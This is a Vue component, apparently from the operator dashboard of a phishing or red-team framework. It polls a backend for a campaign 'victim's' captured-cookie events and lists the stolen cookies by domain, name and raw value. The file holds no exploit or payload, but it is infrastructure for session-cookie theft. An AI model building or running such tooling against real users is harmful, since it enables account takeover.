<script setup>
import { ref } from 'vue'
import { backendService } from '@/services/backend'
import { useVisibilityPolling } from '@/composables/useVisibilityPolling'
import DataTable from 'primevue/datatable'
import Column from 'primevue/column'

const props = defineProps({
    victim: Object,
    active: {
        type: Boolean,
        default: false
    }
})

const events = ref([])
const loading = ref(false)
const error = ref(null)

async function fetchCookies(signal) {
    try {
        loading.value = true
        error.value = null

        const response = await backendService.getAllVictimEvents(
            props.victim.campaign_id,
            props.victim.id,
            { signal }
        )

        if (!response || !response.events) {
            throw new Error('Invalid response from server')
        }

        const eventsData = response.events
        const allCookies = []

        eventsData.forEach(event => {
            if (event.event_type === 'cookie_captured') {
                const p = event.payload || {}
                if (p.cookies_set && Array.isArray(p.cookies_set)) {
                    p.cookies_set.forEach((rawCookie, index) => {
                        allCookies.push({
                            id: `${event.id}-header-${index}`,
                            timestamp: new Date(event.timestamp),
                            source: 'Response Header',
                            domain: p.domain || event.hostname || 'Unknown',
                            rawStr: rawCookie,
                            name: rawCookie.split('=')[0],
                            value: '***'
                        })
                    })
                }
                if (p.name) {
                    allCookies.push({
                        id: event.id,
                        timestamp: new Date(event.timestamp),
                        source: 'Browser API',
                        domain: p.domain || event.hostname || 'Unknown',
                        name: p.name,
                        value: p.value,
                        rawStr: `${p.name}=${p.value}`
                    })
                }

                if (p.cookies && Array.isArray(p.cookies)) {
                    p.cookies.forEach((c, idx) => {
                        allCookies.push({
                            id: `${event.id}-dump-${idx}`,
                            timestamp: new Date(event.timestamp),
                            source: 'Bulk Dump',
                            domain: c.domain || event.hostname || 'Unknown',
                            name: c.name,
                            value: c.value,
                            rawStr: `${c.name}=${c.value}`
                        })
                    })
                }
            }
        })

        allCookies.sort((a, b) => b.timestamp - a.timestamp)
        events.value = allCookies

    } catch (err) {
        if (err?.name === 'AbortError') return
        console.error('Failed to fetch cookies:', err)
        error.value = err.message
    } finally {
        loading.value = false
    }
}

function formatTime(timestamp) {
    return timestamp.toLocaleString()
}

useVisibilityPolling(fetchCookies, {
    intervalMs: 10000,
    enabled: () => props.active
})
</script>

<template>
    <div class="cookies-panel">
        <div class="panel-header">
            <h4>🍪 Captured Cookies</h4>
            <div class="events-count">{{ events.length }} cookies captured</div>
        </div>

        <div v-if="loading && events.length === 0" class="cookies-loading" aria-label="Loading cookies">
            <Skeleton v-for="index in 6" :key="index" height="2.5rem" borderRadius="6px" />
        </div>

        <div v-else-if="error" class="error-state">
            <i class="pi pi-exclamation-triangle state-icon state-icon--danger"></i>
            <p>Failed to load cookies: {{ error }}</p>
        </div>

        <div v-else-if="events.length === 0" class="empty-state">
            <i class="pi pi-box" style="font-size: 2rem; color: var(--color-text-mute)"></i>
            <p>No cookies intercepted yet</p>
        </div>

        <div v-else class="cookie-table-container">
            <DataTable
                :value="events"
                paginator
                :rows="10"
                :rowsPerPageOptions="[10, 20, 50]"
                class="data-table p-datatable-sm cookie-table"
                sortField="timestamp"
                :sortOrder="-1"
                responsiveLayout="scroll"
            >
                <Column field="timestamp" header="Time" sortable>
                    <template #body="slotProps">
                        <span class="muted-text">{{ formatTime(slotProps.data.timestamp) }}</span>
                    </template>
                </Column>
                <Column field="domain" header="Domain" sortable></Column>
                <Column field="name" header="Name" sortable></Column>
                <Column field="source" header="Source" sortable>
                    <template #body="slotProps">
                        <span class="badge" :class="slotProps.data.source.replace(' ', '-').toLowerCase()">
                            {{ slotProps.data.source }}
                        </span>
                    </template>
                </Column>
                <Column field="rawStr" header="Raw / Value">
                    <template #body="slotProps">
                        <div class="cookie-value" :title="slotProps.data.rawStr">
                            {{ slotProps.data.rawStr }}
                        </div>
                    </template>
                </Column>
            </DataTable>
        </div>
    </div>
</template>

<style scoped>
.cookies-panel {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

.panel-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.panel-header h4 {
    font-size: 1rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

.events-count {
    font-size: 0.75rem;
    color: var(--color-text-mute);
    background-color: var(--color-background-mute);
    padding: 0.25rem 0.75rem;
    border-radius: 12px;
    border: 1px solid var(--color-border);
}

.cookies-loading {
    display: flex;
    flex-direction: column;
    gap: 0.5rem;
}

.error-state,
.empty-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 1rem;
    padding: 3rem;
    background-color: var(--color-background-mute);
    border: 1px dashed var(--color-border);
    border-radius: 6px;
}

.cookie-table-container {
    border: 1px solid var(--color-border);
    border-radius: 6px;
    overflow: hidden;
}

.muted-text {
    font-size: 0.8rem;
    color: var(--color-text-mute);
}

.cookie-value {
    max-width: 300px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.8rem;
    background: var(--color-background-mute);
    padding: 0.25rem 0.5rem;
    border-radius: 4px;
}

.badge {
    font-size: 0.7rem;
    padding: 2px 6px;
    border-radius: 4px;
    background: var(--info);
    color: white;
}

.badge.response-header { background: var(--warning); color: var(--text-inverse); }
.badge.bulk-dump { background: var(--success); color: var(--text-inverse); }
.badge.browser-api { background: var(--info); color: var(--text-inverse); }

.state-icon {
    font-size: 2rem;
}

.state-icon--danger {
    color: var(--danger);
}
</style>
